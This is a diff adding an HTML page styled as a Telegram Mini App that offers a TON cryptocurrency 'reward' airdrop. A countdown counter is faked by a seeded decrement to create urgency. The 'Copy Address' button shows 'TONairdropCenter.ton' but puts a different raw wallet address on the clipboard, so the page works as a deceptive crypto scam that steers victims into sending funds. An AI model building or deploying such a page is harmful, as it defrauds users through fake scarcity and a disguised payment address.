@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram Mini App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body, html {
+      margin: 0; padding: 0; overflow: auto;
+      font-family: Arial, sans-serif;
+      background-color: #000; color: white;
+    }
+    .page {
+      display: none; flex-direction: column;
+      align-items: center; justify-content: flex-start;
+      min-height: 100vh; width: 100%;
+      background-size: cover; background-position: top;
+      position: relative;
+    }
+    #page1 {
+      display: flex;
+      background-image: url('https://tonbotofficial.github.io/ton-miniapp/screen1.gif');
+    }
+    #counter {
+      margin-top: 100px; /* پایین‌تر از خط قرمز */
+      font-size: 36px; font-weight: bold;
+      background: rgba(0,0,0,0.5); padding: 10px 20px;
+      border-radius: 10px;
+    }
+    .button {
+      position: absolute; bottom: 60px; /* موقعیت دکمه بین دو خط قرمزی */
+      padding: 15px 30px; font-size: 18px;
+      background-color: orange; color: white;
+      border: none; border-radius: 8px; cursor: pointer;
+    }
+    #page2 {
+      display: none;
+      background-image: url('https://tonbotofficial.github.io/ton-miniapp/screen2.jpg');
+    }
+    .copy-container {
+      position: absolute; top: 43%;
+      left: 50%; transform: translate(-50%, -50%);
+      width: 80%;
+    }
+    .copy-box {
+      padding: 15px; background: white; color: black;
+      border-radius: 5px; text-align: center;
+      font-weight: bold; font-size: 16px;
+    }
+    .copy-btn {
+      margin-top: 10px; width: 100%; padding: 12px;
+      background-color: orange; color: white;
+      font-size: 16px; border: none; border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div id="page1" class="page">
+    <img src="https://tonbotofficial.github.io/ton-miniapp/screen1.gif" alt="Welcome GIF" style="width:100%;height:auto;margin-top:20px;">
+    <div id="counter">300,000</div>
+    <button class="button" onclick="goToPage2()">Claim Your Reward Now</button>
+  </div>
+  <div id="page2" class="page">
+    <div class="copy-container">
+      <div class="copy-box" id="address-box">TONairdropCenter.ton</div>
+      <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+    </div>
+  </div>
+  <script>
+    const INITIAL_COUNT = 300000;
+    const MIN_COUNT = 0;
+    const TICK_INTERVAL = 700;
+    const START_TIMESTAMP = new Date('2025-04-24T00:00:00Z').getTime();
+    function lcg(seed) {
+      return function() {
+        seed = (1103515245 * seed + 12345) % 2147483648;
+        return seed / 2147483648;
+      };
+    }
+    function getCurrentCount() {
+      const now = Date.now();
+      let ticks = Math.floor((now - START_TIMESTAMP) / TICK_INTERVAL);
+      if (ticks < 0) ticks = 0;
+      const random = lcg(123456);
+      let count = INITIAL_COUNT;
+      for (let i = 0; i < ticks; i++) {
+        const dec = Math.floor(random() * 41) + 10;
+        count -= dec;
+        if (count <= MIN_COUNT) return MIN_COUNT;
+      }
+      return count;
+    }
+    function updateCounter() {
+      document.getElementById('counter').textContent = getCurrentCount().toLocaleString();
+    }
+    function goToPage2() {
+      document.getElementById('page1').style.display = 'none';
+      document.getElementById('page2').style.display = 'flex';
+    }
+    function copyAddress() {
+      navigator.clipboard.writeText('UQCBs-if5oGQylQG7ved_1bwZtoQ6ig6gm4SxeZbAYwjFDsG').then(() => {
+        alert('Address copied!');
+      });
+    }
+    updateCounter();
+    setInterval(updateCounter, TICK_INTERVAL);
+  </script>
+</body>
+</html>
